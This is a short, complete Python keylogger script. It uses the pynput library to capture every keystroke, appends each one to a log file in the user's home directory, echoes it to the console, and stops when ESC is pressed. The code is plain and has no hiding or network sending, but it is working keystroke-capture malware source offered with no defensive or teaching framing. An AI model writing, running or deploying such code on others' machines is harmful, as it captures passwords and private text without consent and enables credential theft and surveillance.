import os
from pynput import keyboard
from datetime import datetime

LOG_FILE = os.path.expanduser('~/keylog.txt')

# Ensure log file exists
start_msg = f'\n--- Keylogger started at {datetime.now()} ---\n'
with open(LOG_FILE, 'a') as f:
    f.write(start_msg)
print(start_msg, end='')

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = f'<{key}>'
    with open(LOG_FILE, 'a') as f:
        f.write(k)
    print(k, end='', flush=True)

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener with ESC
        print("\n--- Keylogger stopped by user (ESC pressed) ---")
        return False

if __name__ == '__main__':
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join() 